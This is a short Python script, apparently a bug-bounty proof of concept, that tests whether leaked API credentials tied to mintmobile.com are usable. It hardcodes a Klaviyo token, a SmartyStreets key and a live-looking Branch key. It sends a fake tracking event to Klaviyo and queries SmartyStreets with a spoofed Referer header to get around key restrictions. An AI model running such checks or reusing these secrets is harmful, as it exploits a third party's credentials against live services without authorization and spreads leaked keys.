#!/usr/bin/env python3
"""
Final Secret Sweep - Testing Klaviyo and SmartyStreets
"""

import requests
import json
from rich.console import Console

console = Console()

SECRETS = {
    'KLAVYO_TOKEN': 'H8tAtU',
    'SMARTY_WEB_KEY': '12142033893385089',
    'BRANCH_KEY': 'key_live_koP1JAQau1WK4fKP1STYnlmguzlzrqr3'
}

def test_klaviyo():
    console.print("\n[cyan]🔍 Testing Klaviyo Public Token...[/cyan]")
    url = "https://a.klaviyo.com/api/track"
    # Klaviyo public tokens are used to track events
    payload = {
        "token": SECRETS['KLAVYO_TOKEN'],
        "event": "POC Test Event",
        "customer_properties": {
            "$email": "poc_test@example.com"
        }
    }
    try:
        # Klaviyo track/identify usually takes base64 or form-data
        params = {'data': json.dumps(payload)}
        r = requests.get(url, params=params, timeout=10)
        console.print(f"  Result: {r.status_code} - {r.text}")
        if r.text == "1":
            console.print("  [red]✗ KLAVYO TOKEN IS VALID![/red]")
            console.print("  [red]✗ Impact: Unauthorized user tracking / data poisoning[/red]")
    except Exception as e:
        console.print(f"  Error: {e}")

def test_smartystreets():
    console.print("\n[cyan]🔍 Testing SmartyStreets Web Key...[/cyan]")
    # Web keys require a Referer usually, but let's test direct first
    url = "https://us-street.api.smartystreets.com/street-address"
    params = {
        'auth-id': SECRETS['SMARTY_WEB_KEY'],
        'street': '1600 Amphitheatre Pkwy',
        'city': 'Mountain View',
        'state': 'CA',
        'zipcode': '94043',
        'candidates': 1
    }
    headers = {
        'Referer': 'https://www.mintmobile.com/'
    }
    try:
        r = requests.get(url, params=params, headers=headers, timeout=10)
        console.print(f"  Result: {r.status_code}")
        if r.status_code == 200:
            console.print("  [red]✗ SMARTYSTREETS KEY IS VALID![/red]")
            console.print(f"  [red]✗ Data: {r.text[:200]}[/red]")
        else:
            console.print(f"  Response: {r.text}")
    except Exception as e:
        console.print(f"  Error: {e}")

if __name__ == "__main__":
    test_klaviyo()
    test_smartystreets()
